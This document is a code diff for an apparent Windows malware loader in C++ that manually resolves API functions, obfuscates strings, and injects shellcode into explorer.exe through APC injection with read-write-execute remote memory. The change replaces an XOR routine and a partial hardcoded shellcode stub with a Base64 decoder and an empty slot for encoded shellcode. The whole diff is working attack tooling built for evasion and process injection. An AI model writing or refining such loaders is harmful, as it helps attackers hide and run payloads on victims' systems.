@@ -101,11 +101,27 @@ FARPROC get_proc_address_manual(HMODULE h_mod, const char* func_name) {
     return NULL;
 }
 
-// Simple XOR encryption/decryption for the shellcode
-void xor_crypt(std::vector<unsigned char>& data, const std::string& key) {
-    for (size_t i = 0; i < data.size(); ++i) {
-        data[i] ^= key[i % key.length()];
+// Decodes a Base64 encoded string
+std::string base64_decode(std::string const& encoded_string) {
+    std::string base64_chars =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        "abcdefghijklmnopqrstuvwxyz"
+        "0123456789+/";
+    std::string decoded;
+    std::vector<int> T(256, -1);
+    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;
+
+    int val = 0, valb = -8;
+    for (char c : encoded_string) {
+        if (T[c] == -1) break;
+        val = (val << 6) + T[c];
+        valb += 6;
+        if (valb >= 0) {
+            decoded.push_back(char((val >> valb) & 0xFF));
+            valb -= 8;
+        }
     }
+    return decoded;
 }
 
 // Finds a process ID by its name
@@ -208,17 +224,9 @@ int main() {
     api.VirtualFreeEx_ptr = (pVirtualFreeEx)get_proc_address_manual(h_kernel32, OBF_STR("VirtualFreeEx").c_str());
 
     // --- Shellcode ---
-    std::vector<unsigned char> shellcode = {
-        // Placeholder for actual shellcode (e.g., calc.exe for x64)
-        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
-        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
-        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
-        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
-        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20,
-    };
-    std::string key = OBF_STR("a_very_secret_key_that_is_long");
-    xor_crypt(shellcode, key); // Encrypt shellcode
-    xor_crypt(shellcode, key); // Decrypt shellcode at runtime
+    // The shellcode should be Base64 encoded and placed inside the OBF_STR macro.
+    std::string encoded_shellcode = OBF_STR("");
+    std::string decoded_shellcode = base64_decode(encoded_shellcode);
 
     // --- APC Injection ---
     DWORD proc_id = get_proc_id(api, OBF_STR("explorer.exe").c_str());
@@ -227,13 +235,13 @@ int main() {
     HANDLE h_proc = api.OpenProcess_ptr(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, proc_id);
     if (h_proc == NULL) return 1;
 
-    LPVOID remote_mem = api.VirtualAllocEx_ptr(h_proc, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID remote_mem = api.VirtualAllocEx_ptr(h_proc, NULL, decoded_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (remote_mem == NULL) {
         api.CloseHandle_ptr(h_proc);
         return 1;
     }
 
-    if (!api.WriteProcessMemory_ptr(h_proc, remote_mem, shellcode.data(), shellcode.size(), NULL)) {
+    if (!api.WriteProcessMemory_ptr(h_proc, remote_mem, decoded_shellcode.c_str(), decoded_shellcode.size(), NULL)) {
         api.VirtualFreeEx_ptr(h_proc, remote_mem, 0, MEM_RELEASE);
         api.CloseHandle_ptr(h_proc);
         return 1;
